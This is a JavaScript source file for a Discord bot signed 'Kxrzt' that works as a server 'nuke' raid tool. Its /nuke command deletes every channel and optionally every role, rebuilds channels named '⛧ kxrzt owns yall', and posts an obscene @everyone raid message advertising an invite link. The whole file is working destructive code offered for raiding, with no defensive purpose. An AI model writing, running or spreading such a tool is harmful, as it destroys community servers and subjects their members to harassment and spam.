import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, MessageFlags, ChannelType, PermissionFlagsBits,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder,
} from 'discord.js';

/* ===================== CONFIG ===================== */
const RAID_MESSAGE =
  `# @everyone FUCK Y'ALL BITCHES, EASY RAID ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #`;

const PENT = '⛧';
const BASE_NAME = `${PENT} kxrzt owns yall`;
const CATEGORY_NAME = BASE_NAME;

const TEXT_COUNT = 5;
const VOICE_COUNT = 3;

const ALWAYS_NUMBER = true;

const SPAM_PER_CHANNEL = 1;
const DELETE_DELAY = 350;
const CREATE_DELAY = 600;
const SEND_DELAY   = 400;

const MENTIONS = { parse: ['everyone', 'roles', 'users'] };
const sleep = ms => new Promise(r => setTimeout(r, ms));
/* ================================================== */

const HELP_EMBED = new EmbedBuilder()
  .setColor(0x5865F2)
  .setTitle('Commands')
  .setDescription('Everything this app can do:')
  .addFields(
    { name: '/nuke [spam] [roles]', value: 'Deletes every channel and rebuilds the server. Optional: delete all roles and spam the raid text.' },
    { name: '/help', value: 'Shows this list.' },
  )
  .setFooter({ text: 'Made by Kxrzt' });

/* ---------- helpers ---------- */

async function resolveGuild(interaction) {
  if (interaction.guild) return interaction.guild;
  try {
    return await interaction.client.guilds.fetch(interaction.guildId);
  } catch {
    return interaction.client.guilds._add({ id: interaction.guildId }, false);
  }
}

async function getAllChannels(guild) {
  if (guild.channels.cache.size) {
    return [...guild.channels.cache.values()].filter(c => !c.isThread());
  }
  const fetched = await guild.channels.fetch();
  return [...fetched.values()].filter(c => c && !c.isThread());
}

/* ---------- nuke steps ---------- */

async function deleteAllChannels(guild, onProgress) {
  const all = await getAllChannels(guild);

  const ordered = [
    ...all.filter(c => c.type !== ChannelType.GuildCategory),
    ...all.filter(c => c.type === ChannelType.GuildCategory),
  ];

  let done = 0;
  for (const ch of ordered) {
    try { await ch.delete('nuke'); } catch {}
    done++;
    if (onProgress && done % 3 === 0) onProgress(`💣 deleting channels… ${done}/${ordered.length}`);
    await sleep(DELETE_DELAY);
  }
  return ordered.length;
}

async function deleteAllRoles(guild) {
  const roles = await guild.roles.fetch();

  const targets = [...roles.values()].filter(r =>
    r.id !== guild.id &&   // @everyone
    !r.managed
  );

  let done = 0;
  for (const role of targets) {
    try { await role.delete('nuke'); done++; } catch {}
    await sleep(300);
  }
  return done;
}

/* ---------- channel naming ---------- */

function nameFor(index) {
  if (ALWAYS_NUMBER) return index === 0 ? BASE_NAME : `${BASE_NAME} ${index + 1}`;
  return BASE_NAME;
}

async function createChannel(guild, index, type, parentId) {
  const wanted = nameFor(index);
  const fallback = `${BASE_NAME} ${index + 1}`;
  const candidates = wanted === fallback ? [wanted] : [wanted, fallback];

  for (let i = 0; i < candidates.length; i++) {
    try {
      return await guild.channels.create({
        name: candidates[i],
        type,
        parent: parentId,
        reason: 'nuke',
      });
    } catch (err) {
      if (i === candidates.length - 1) throw err;
      console.log(`"${candidates[i]}" fehlgeschlagen -> retry als "${fallback}"`);
    }
  }
}

async function rebuild(guild, onProgress) {
  const parent = await guild.channels.create({
    name: CATEGORY_NAME,
    type: ChannelType.GuildCategory,
    reason: 'nuke',
  });
  await sleep(CREATE_DELAY);

  const textChannels = [];
  let index = 0;

  for (let i = 0; i < TEXT_COUNT; i++, index++) {
    const ch = await createChannel(guild, index, ChannelType.GuildText, parent.id);
    textChannels.push(ch);
    if (onProgress) onProgress(`🔨 building… ${textChannels.length}/${TEXT_COUNT}`);
    await sleep(CREATE_DELAY);
  }

  for (let i = 0; i < VOICE_COUNT; i++, index++) {
    await createChannel(guild, index, ChannelType.GuildVoice, parent.id);
    await sleep(CREATE_DELAY);
  }

  return textChannels;
}

async function spamRaid(channels, onProgress) {
  let sent = 0;
  for (const ch of channels) {
    for (let i = 0; i < SPAM_PER_CHANNEL; i++) {
      try {
        await ch.send({ content: RAID_MESSAGE, allowedMentions: MENTIONS });
        sent++;
      } catch {}
      await sleep(SEND_DELAY);
    }
    if (onProgress) onProgress(`📨 spamming… ${sent} messages`);
  }
  return sent;
}

/* ---------- client ---------- */

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once(Events.ClientReady, c => console.log(`Online as ${c.user.tag}`));

client.on(Events.InteractionCreate, async interaction => {
  try {
    // ---------------- /help ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'help') {
      return interaction.reply({ embeds: [HELP_EMBED], flags: MessageFlags.Ephemeral });
    }

    // ---------------- /nuke ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'nuke') {
      if (!interaction.guildId) {
        return interaction.reply({
          content: 'Run this in a server channel (not in a DM).',
          flags: MessageFlags.Ephemeral,
        });
      }

      const spam = interaction.options.getBoolean('spam') ?? true;
      const roles = interaction.options.getBoolean('roles') ?? false;

      const userPerms = interaction.memberPermissions;
      const appPerms = interaction.appPermissions;

      const missing = [];
      if (!userPerms?.has(PermissionFlagsBits.ManageChannels)) missing.push('Manage Channels (you)');
      if (roles && !userPerms?.has(PermissionFlagsBits.ManageRoles)) missing.push('Manage Roles (you)');
      if (appPerms && !appPerms.has(PermissionFlagsBits.ManageChannels)) missing.push('Manage Channels (app)');

      if (missing.length) {
        return interaction.reply({
          content:
            `❌ You don't have the needed permissions here.\nMissing: **${missing.join(', ')}**\n` +
            `You need **Administrator** or at least **Manage Channels**.`,
          flags: MessageFlags.Ephemeral,
        });
      }

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`nuke:go:${spam ? 1 : 0}:${roles ? 1 : 0}`)
          .setLabel('NUKE IT')
          .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
          .setCustomId('nuke:cancel')
          .setLabel('cancel')
          .setStyle(ButtonStyle.Secondary),
      );

      return interaction.reply({
        content:
          `⚠️ **${interaction.guild?.name ?? 'this server'}**\n` +
          `This deletes **all** channels${roles ? ' and **all** deletable roles' : ''} and rebuilds them.\n` +
          `Continue?`,
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
    }

    if (interaction.isButton() && interaction.customId.startsWith('nuke:')) {
      const [, action, spamFlag, rolesFlag] = interaction.customId.split(':');

      if (action === 'cancel') {
        return interaction.update({ content: '❌ nuke cancelled.', components: [] });
      }

      const spam = spamFlag === '1';
      const roles = rolesFlag === '1';

      const guild = await resolveGuild(interaction);

      await interaction.update({ content: '💣 nuking…', components: [] });

      let lastEdit = 0;
      const onProgress = text => {
        const now = Date.now();
        if (now - lastEdit < 1200) return;
        lastEdit = now;
        interaction.editReply({ content: text }).catch(() => {});
      };

      const deletedChannels = await deleteAllChannels(guild, onProgress);
      const deletedRoles = roles ? await deleteAllRoles(guild) : 0;
      const textChannels = await rebuild(guild, onProgress);
      const sent = spam ? await spamRaid(textChannels, onProgress) : 0;

      const summary =
        `✅ **Nuke done.**\n` +
        `Deleted: **${deletedChannels}** channels` +
        (roles ? ` + **${deletedRoles}** roles` : '') + `\n` +
        `Created: **${textChannels.length + VOICE_COUNT + 1}** ` +
        `(1 category, ${TEXT_COUNT} text, ${VOICE_COUNT} voice)\n` +
        (spam ? `Spammed raid text: **${sent}** messages` : 'No spam.');

      try {
        await interaction.editReply({ content: summary });
      } catch {
        try { await interaction.user.send(summary); } catch {}
      }
      return;
    }
  } catch (err) {
    console.error(err);
    try {
      if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral });
      } else if (interaction.isRepliable()) {
        await interaction.followUp({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral });
      }
    } catch {}
  }
});

client.login(process.env.DISCORD_TOKEN);